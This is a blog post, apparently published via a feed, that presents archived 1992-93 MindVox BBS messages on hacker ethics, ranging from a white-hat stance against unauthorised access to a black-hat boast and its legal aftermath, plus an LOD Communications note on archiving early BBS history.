id=&quot;a-timeless-discussion-on-hacker-ethics&quot;&gt;A Timeless Discussion on Hacker Ethics&lt;/h1&gt;
+&lt;p&gt;Proper ethical hacking and vulnerability disclosure practices have presented a timeless argument for hackers and information security professionals alike since the inception of the Internet.  Many young information security professionals, including myself, were not around for these early conversations on what constitutes ethical hacking.  I thought it would be pertinent to highlight some of these conversations to better understand in what ways computer security has changed as well as how it has remain the same.  To my knowledge the oldest underground bulletin board is the 8BBS system (circa 1979-80) which I have unfortunately been unsuccessful in locating an archive.  It would be interesting to see if/how the concept of ethical hacking was approached in the early 1979-80’s.&lt;/p&gt;
+
+&lt;p&gt;Below are a selection of emails and posts from the MindVox system which pertain to ethical hacking.  These emails and posts were written between 6 August 1992 and 9 June 1993.  The thoughts expressed in these emails remain remarkably relevant today.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;white-hat-ethics&quot;&gt;White Hat Ethics&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Subject: HakKing is BAD
+From: digital (Patrick K. Kroupa)
+Message-ID: &amp;lt;BeN4oB3w165w@mindvox.phantom.com&amp;gt;
+Date: Thu, 06 Aug 92 15:16:34 EDT
+Organization: [Phantom Access] / the MindVox system
+
+
+&quot;Is it ethically ok to access computers that don't belong to you?&quot;
+
+That's a very un-answerable question since it will vary greatly from one 
+individual to the next.  You'd have to define &quot;ethical&quot; first and then make
+sure that everyone involved adhered to the same interpretation of the word,
+and then give everyone a BIG COLORFUL BADGE that says &quot;AUTHORIZED&quot; and follow
+it all up with a firm handshake looking deeply into their eyes and saying &quot;I
+love you&quot; and . . . umm, where was I, oh yeah....
+
+It is my personal belief that NO ONE has the RIGHT to access any computer,
+network, device, or place; virtual or physical, that does not belong to them,
+or where they have not been CLEARLY invited by the owner's or representatives
+of same.
+
+If EVIL SUPER-BAD MEGACORP has 24 Connection Machines accessible via local
+dialup, and the root password is &quot;abcdef&quot; you still do not have the &quot;right&quot;
+to access their machines, much less take any sort of action against them. 
+
+
+But ya know, there's right and wrong, good and evil, anthracite and puce, and
+then there's stupidity.  While you have the absolute right to take a new
+Ferrari, leave the keys in the ignition, the window rolled down, and park it
+in Harlem....   there's this wonderful thing called COMMON SENSE that
+says,  &quot;Gee ya know... that may not be a very good idea!&quot;  Computer
+security is very similar to that.  While I know a lot of people who, um...
+look at things... and very few of them have any sort of harmful intentions,
+much less interest in the data they gain access to...  I also trust their
+judgement about as much as I  trust the average 6th grader's.  They don't
+mean any harm, none-the-less it  certainly isn't helpful to me for anyone
+else to have access to MY PERSONAL JUNK.
+
+What I'm finding more and more, is people who have sensitive material on their
+computer, just aren't hooking them into networks.  As an example there's my
+father, and a lotta his friends.  They have contracts with the government and
+various military agencies, they have a lotta stuff on their machines that
+is  considered &quot;classified&quot; or sensitive.  Their solution to security, is
+purely physical in most cases.  They don't know much about Unix, and they
+don't wanna know, they don't read news, or want to get email from people,
+they just don't bother to plug their personal machines into the ethernet. 
+The only way to get at its contents is to physically steal the thing.
+
+When you're running simulations or something that is extremely processor 
+intensive, then obviously it has to go on other machines, or over
+networks, but for the most part, what's really &quot;sensitive&quot; is just
+information that isn't meant to be publicly accessible. 
+
+What comprises &quot;sensitive&quot; material varies greatly, company X's SUPER NEW 
+ULTRA-SECRET THREE WEEK PLAN, is probably of interest to nobody, except
+COMPANY Y who is in competition with 'em. 
+
+All things are relative; right now the attitude is that people find this lack
+of &quot;security&quot; scary, so they run around in little circles, call up various law
+enforcement agencies, who in turn grab their guns and kick in doors and
+make a big fuss over it.
+
+When people are scared, they tend to do silly things.  People ARE *VERY*
+afraid right now, of a lot of things in general, and this is one area in
+which fear can be very effectively channeled and focused on THE BAD GUY,
+who in most cases is represented as some teenager who is personally
+responsible for EVERYTHING wrong with their lives in general, and their
+computer's in particular.
+
+None of it bears any relation to reality, but then again, neither does life
+most of the time.
+
+Patrick
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;gray-hat-ethics&quot;&gt;Gray Hat Ethics&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Subject: ...
+From: phiber (Phiber Optik)
+Message-ID: &amp;lt;eoX0oB3w165w@mindvox.phantom.com&amp;gt;
+Date: Mon, 10 Aug 92 00:44:13 EDT
+Organization: [Phantom Access] / the MindVox system
+
+I never cease to be surprised when people smugly state &quot;you don't have to
+hack into something, why, you can BUY your own unix box for 'x' hundred
+dollars.&quot;  I had no idea that unix is all there ever was.  There really
+isn't anything else out there?  Just unix???  Wow.  Wait, isn't this Earth
+in the 20th century?  Whoops!  Silly me!  Back into the TARDIS!  
+&amp;lt;whoosh!&amp;gt;
+
+That's like saying &quot;Columbus didn't have to discover the New World and
+annoy the natives, he had plenty of land in Europe to play with!&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;black-hat-ethics&quot;&gt;Black Hat ‘Ethics’&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Subject: Re: !
+From: netw1z (Ama ama)
+Message-ID: &amp;lt;LNJcyB3w165w@mindvox.phantom.com&amp;gt;
+Date: Tue, 02 Feb 93 08:36:32 EST
+In-Reply-To: &amp;lt;3JJcyB2w165w@mindvox.phantom.com&amp;gt;
+Organization: [Phantom Access] / the MindVox system
+
+All these folks talking about hacking and yet..
+not a hacker among you..
+If i read another posst from you 
+leeches , killer cracker using
+card abuse, code dialing,
+board calling , .edusite inet
+account crackers post anpother
+annoying thing i will laugh
+again becase you are laughing
+stock..
+then.. there was the outsiders looking in who think
+they know.. thisisnt a snide remark but sudeenly bruce sterling
+wrote a book andnow thinks he is (wellnot thinks.. everyone else thinks
+this too) he is an expert on &quot;hacking&quot; and the &quot;underground&quot;
+no true practionerof this clandestine art has really come forward
+if they do.. it usually is some old timer who is completely out of
+touch with what is ot t out thier now..
+Rhetoric!#@
+tons of cool thingshave happened and can stillhappen..
+but only by the few..
+the few ..
+never have so many been so terrorized by so few..
+sure.. people say hacking is dead.. the balance disrupted de
+due to the busts of the hackers responsible for
+the &quot;trickle-down theory&quot; (which isbasically what the PUBLIC underground
+works on fortythe casual hackers)
+and technology advances which allowfor clear digital monitoring and call 
+tracing..
+but the truth is there will always be someone there
+to answer the challangee.. 
+ 
+but it certainly isnt ANY of you!#@
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;a-consequence-of-black-hat-ethics&quot;&gt;A Consequence of Black Hat ‘Ethics’&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Subject: Re: Ethics in Cyberspace
+From: chemist (The Chemist)
+Message-ID: &amp;lt;eDoV5B3w165w@mindvox.phantom.com&amp;gt;
+Date: Wed, 09 Jun 93 08:54:25 EDT
+In-Reply-To: &amp;lt;qsyu5B3w165w@mindvox.phantom.com&amp;gt;
+Organization: [Phantom Access] / the MindVox system
+
+
+Nice message Tox, had a lot of interesting points to cover and its
+applicable long past its time. 
+
+Speaking of real hackers and ethics, John Lee (Corrupt) aka: netw1z online
+here a few weeks ago, was sentenced to 1 year in jail on Monday I think,
+or late last week. SLAM DUNK.
+
+
+-tC
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;bonus-internet-archeology&quot;&gt;Bonus: Internet Archeology&lt;/h2&gt;
+
+&lt;p&gt;This message from LOD Communications struck a chord with me since the activities and people involved in the 8BBS system were just as much ancient history to the MindVox group as the MindVox group is ancient history to myself.  An apt analogy to this would be a Roman soldier admiring the ancient Egyptian pyramids after overtaking the Ptolemaic Kingdom in 30 BCE and a tourist admiring the ancient pyramids today.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Subject: Additional Comments
+From: lodcom (LOD Communications)
+Message-ID: &amp;lt;2k9y2B7w165w@mindvox.phantom.com&amp;gt;
+Date: Tue, 13 Apr 93 23:23:00 EDT
+Organization: [Phantom Access] / the MindVox system
+
+ 
+
+Ali Baba: Regarding the Mondo/Vox article etc., the project actually got
+started when some of us started dusting off our old disks for PAT/VOX. After
+talking it over with PAT late last year (we have been working on this ever
+since) it was determined that they were way too busy with the upgrades at Vox
+to do anything with our disks and printouts. After we realized how much work
+was involved we had to make a decision as to what direction this project was
+to take, if any.
+
+The people involved in this project (quite a few actually) are not in high
+school with nothing better to do (not that we think anyone reading this
+is) and therefore value what little spare time they have. Its one thing to
+ask people to give up most of their free time, its another to say that they
+won't be compensated for all the effort. So a &quot;pittance&quot; as Erikb says, is
+being charged not so much for the information itself (information wants to
+be free!#@$&amp;amp;1), but for all the effort and costs (well over $1000 believe
+it or not) to bring the information to the masses errrr all 30 people in
+the U.S. [as Thug says ;) ].
+
+As for the LOD Retirement Village 8+/, a lot of the money will be recycled
+for 2 other projects whose aim is to provide additional historical background
+on the Computer Underground Community. And although it may not seem like
+much, at least half of the sales of the Metal Shop Private BBS Message Base
+will be donated to Knight Lightning's (Craig N.) legal defense fund...after
+all, they helped too. More of a non-profit organization than a &quot;ruthless
+corporate power&quot;....
+
+The project's aim in addition to 'making our old machines work again' as
+ErikB says, is to document some of the history of the 'dark' portion of
+Cyberspace. No one is exactly sure how many people really care, but from the
+large response we have received due to ads in 2600, Phrack, and CUD, there
+appears to be plenty out there who want to see what went on. An interesting
+point is how many people on the planet even have messages from some of the
+first (if not THE 1st) phreak/hack BBS systems such as 8BBS (Circa 1979/80)?
+We have found only one source through all our contacts. And that source has
+them on a TRS-80 machine that wasn't powered up in 6 years or so. He has been
+dutifully transferring messages at 300 baud (Modems still go that slow?) in
+his spare time (very little as he manages a TV station and has a family).
+
+To recapitulate on the main goal--it is to continue to scrounge around for
+all these old messages (which are really quite interesting since we have
+basically excluded C0DEZ B0ARDZ) and provide a fairly comprehensive look at
+the use of BBS's for Underground Activities. Unfortunately, without the
+support of the public, it may not be possible to sustain the effort due to
+the costs involved but we will see how things play out.
+
+It's funny but a lot of people today forget that back then we did not have
+14.4 Kbaud modems and 250 MB hard drives. Most messages we have were
+downloaded at 300 baud onto 143K disk drives, with each file usually no
+larger than 15K in size (And we LIKED it! Where's my funny looking Hat? ahem)
+Its not like anyone called up all the bbs's one after the other, downloaded
+the complete message base in 10 minutes, saved it into one file per bbs, and
+is now selling them. Not that anyone here is implying that either.
+
+Deckard: &quot;quicktime interviews with the old hackers, etc.&quot; One thing we did
+do is track down a lot of the system operators of the boards or those who
+were on the board and knew inside details. We twisted their arms to write a 
+&quot;BBS Pro-Phile&quot; [Ala Taran King's Phrack Pro-Phile] specifically for this
+project. The BBS Pro-Phile provides various background information on the
+different Boards and interesting stories related to them. In addition Philes
+online were added to the message bases if we could find them. Ie: all the
+Osuny &quot;bulletins&quot; are included in the Osuny message base (circa 1982/3 and
+over 370 msgs thus far).
+
+Regarding CD_ROMs: It was decided to just provide the Message Base Files in
+compressed format on 3.5/5.25 diskettes. Since we aren't interested in
+selling stuff that is readily accessible on the Internet (ie: electronic
+newsletters, etc. via ftp.eff.org) the volume of material really doesn't
+warrant a CD. Besides, we would be pricing the stuff out of the range of many
+people which is something we didn't want to do. 
+In addition, how many people have CD_ROM Drives? More every day but they
+still aren't as prevalent as diskette drives.
+
+
+Hope we aren't repeating ourselves too much, a lot of these details are
+described in the LISTING due out in 1-2 weeks. Guess the Round-Table is Elite
+since they get the scoop on this before the public does :)
+
+&quot;finger lodcom&quot; for a bit more additional information on the project if you
+like. And if anyone wants to help, let us know.
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;http://www.textfiles.com/bbs/MINDVOX/FORUMS/&quot;&gt;BBS Textfiles: The MindVox Collection&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.textfiles.com/bbs/MINDVOX/FORUMS/ethics&quot;&gt;ethics&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;http://www.textfiles.com/bbs/MINDVOX/FORUMS/round-table&quot;&gt;round-table&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="Hacker" /><category term="Ethics" /><category term="MindVox" /><category term="8BBS" /><summary type="html">A Timeless Discussion on Hacker Ethics Proper ethical hacking and vulnerability disclosure practices have presented a timeless argument for hackers and information security professionals alike since the inception of the Internet. Many young information security professionals, including myself, were not around for these early conversations on what constitutes ethical hacking. I thought it would be pertinent to highlight some of these conversations to better understand in what ways computer security has changed as well as how it has remain the same. To my knowledge the oldest underground bulletin board is the 8BBS system (circa 1979-80) which I have unfortunately been unsuccessful in locating an archive. It would be interesting to see if/how the concept of ethical hacking was approached in the early 1979-80’s.</summary></entry></feed>
